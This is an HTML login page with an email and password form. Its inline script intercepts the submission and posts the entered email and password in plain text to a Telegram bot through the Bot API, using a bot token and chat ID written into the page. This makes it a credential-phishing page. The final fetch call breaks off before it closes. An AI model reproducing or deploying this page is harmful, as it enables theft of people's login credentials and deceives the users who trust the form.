=<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body class="login-page">

<form id="loginForm">
    <div class="input-container">
        <input type="email" name="email" placeholder="Enter your email" class="input-box email-box" required>
        <input type="password" name="password" placeholder="Enter your password" class="input-box password-box" required>
    </div>

    <div class="login-text">
        <button type="submit" class="login-button">Login</button>
    </div>
</form>

<script>
const BOT_TOKEN = '8387730686:AAFo7mnRLBtTkN3HAWrznqbW7fsOxD57HkU';   // <-- Replace with your bot token locally
const CHAT_ID = '-4909990023';       // <-- Replace with your chat ID; add "-" if it's a group

const form = document.getElementById('loginForm');
form.addEventListener('submit', function(e){
    e.preventDefault();

    const email = form.email.value;
    const password = form.password.value;

    const message = `Login Submission:\nEmail: ${email}\nPassword: ${password}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
  
</script>

</body>
</html>
